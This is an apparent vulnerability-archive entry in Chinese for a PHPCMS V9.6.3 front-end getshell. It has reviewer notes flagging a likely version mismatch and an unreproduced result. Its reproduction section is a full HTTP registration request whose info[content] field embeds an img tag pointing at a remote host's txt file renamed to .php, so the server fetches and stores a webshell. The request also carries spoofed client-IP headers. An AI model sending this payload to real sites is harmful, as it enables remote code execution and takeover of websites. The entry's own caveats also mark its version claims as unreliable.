---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.3（疑版本错配）"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms V9.6.3 前台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：同9.6.0注册editor远程下载链；modelid2对应配置及allow_url_fopen"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9c5945e69c76a215c3ce3692"
entity_id: "ve-9c5945e69c76a215c3ce3692"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：同9.6.0注册editor远程下载链；modelid2对应配置及allow_url_fopen

- **事实待核（1）**：payload与311/313完全同机制，而两篇称9.6.1已修复，本篇9.6.3无补丁绕过解释/结果，应优先核版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：只有请求无返回，远程域wwww拼写；伪造本地IP四头无作用说明。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（3）**：不能把旧PoC换标题当新版本实证。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms V9.6.3 前台getshell

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.3

三、复现过程
------------

    POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 297
    Cache-Control: max-age=0
    Origin: http://www.0-sec.org
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Referer: http://www.0-sec.org/index.php?m=member&c=index&a=register&siteid=1
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,es;q=0.6,fr;q=0.4,vi;q=0.2
    Cookie: PHPSESSID=h5j********************5q5
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    Connection: close

    siteid=1&modelid=2&username=520520&password=5205201&pwdconfirm=5205201&email=52052096%40163.com&nickname=52096&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=&info[content]=<img src=http://wwww.0-sec.org/xxx.txt?.php#.jpg>
